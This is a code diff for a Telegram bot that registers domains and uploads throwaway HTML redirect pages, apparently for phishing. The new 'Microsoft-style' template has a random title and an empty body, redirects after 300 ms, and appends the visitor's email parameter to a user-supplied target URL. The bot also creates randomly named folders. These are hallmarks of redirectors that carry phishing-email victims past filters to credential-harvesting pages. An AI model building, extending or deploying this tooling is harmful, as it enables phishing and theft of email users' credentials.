@@ -128,16 +128,56 @@ function generateScriptContent(redirectUrl, delay = 500) {
     .replace('{{TITLE}}', rStr(20));
 }
 
-// New function to generate custom script content
+// Generate custom script content using the Microsoft-style template
 function generateCustomScriptContent(redirectUrl) {
   const template = `<!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta http-equiv="refresh" content="0;url=${redirectUrl}">
-<title>Redirecting...</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>${rStr(20)}</title>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(redirect, 300);
+        });
+
+        // Function to handle redirection
+        function redirect() {
+            var email = getParameterByName('email'); // Attempt to get the email parameter
+            var redirectUrl = "${redirectUrl}";
+
+            if (email) {
+                redirectUrl += email; // Append email if provided
+            } else {
+                console.log("No email provided. Redirecting without email.");
+            }
+
+            console.log("Redirecting to: " + redirectUrl);
+            window.location.href = redirectUrl;
+        }
+
+        // Function to get URL parameters
+        function getParameterByName(name, url = window.location.href) {
+            name = name.replace(/[\\[\\]]/g, '\\\\$&');
+            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
+            var results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\\+/g, ' '));
+        }
+
+        // Function to manually trigger redirection via checkbox
+        function handleCheckboxClick(checkbox) {
+            if (checkbox.checked) {
+                console.log("Checkbox is checked. Redirecting...");
+                redirect();
+            } else {
+                console.log("Checkbox is not checked.");
+            }
+        }
+    </script>
 </head>
 <body>
-  <p>If you are not redirected automatically, <a href="${redirectUrl}">click here</a>.</p>
 </body>
 </html>`;
   return template;
@@ -164,7 +204,9 @@ if (bot) {
     return ctx.reply(
       '🚀 *Domain Provisioning Bot*\n\n' +
       'Welcome! I can help you automatically provision domains with hosting.\n\n' +
-      'Please send me a domain name (e.g., example.com) to get started:',
+      'Please send me a domain name and redirect URL separated by a space:\n' +
+      'Format: `domain.com https://fb.com`\n\n' +
+      'Example: `example.com https://fb.com`',
       { parse_mode: 'Markdown' }
     );
   });
@@ -202,17 +244,41 @@ if (bot) {
     if (session.awaiting_domain) {
       session.awaiting_domain = false;
 
-      // Basic domain validation
-      const domainRegex = /^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,}$/;
-      if (!domainRegex.test(text)) {
+      // Parse domain and redirect URL
+      const parts = text.trim().split(' ');
+      if (parts.length !== 2) {
         session.awaiting_domain = true;
         return ctx.reply(
-          '❌ Invalid domain format. Please enter a valid domain (e.g., example.com):',
+          '❌ Invalid format. Please send domain and redirect URL separated by space:\n' +
+          'Format: `domain.com https://fb.com`',
           { parse_mode: 'Markdown' }
         );
       }
 
-      const domain = text.toLowerCase();
+      const [domainInput, redirectUrl] = parts;
+      
+      // Basic domain validation
+      const domainRegex = /^[a-zA-Z0-9][a-zA-Z0-9-]{0,61}[a-zA-Z0-9]?\.[a-zA-Z]{2,}$/;
+      if (!domainRegex.test(domainInput)) {
+        session.awaiting_domain = true;
+        return ctx.reply(
+          '❌ Invalid domain format. Please enter a valid domain and URL:\n' +
+          'Format: `domain.com https://fb.com`',
+          { parse_mode: 'Markdown' }
+        );
+      }
+
+      // Basic URL validation
+      if (!redirectUrl.startsWith('http://') && !redirectUrl.startsWith('https://')) {
+        session.awaiting_domain = true;
+        return ctx.reply(
+          '❌ Invalid URL format. URL must start with http:// or https://\n' +
+          'Format: `domain.com https://fb.com`',
+          { parse_mode: 'Markdown' }
+        );
+      }
+
+      const domain = domainInput.toLowerCase();
       const log = L(crypto.randomUUID().slice(0, 8));
 
       await ctx.reply(`🔄 Processing domain: *${domain}*\n\nThis may take a few moments...`, 
@@ -228,7 +294,6 @@ if (bot) {
 
         // Step 2: Create 3 folders and upload script files
         const urls = [];
-        const redirectUrl = process.env.DEFAULT_REDIRECT_URL || 'https://example.com';
 
         for (let i = 1; i <= 3; i++) {
           const folderName = rInt(100, 999).toString();
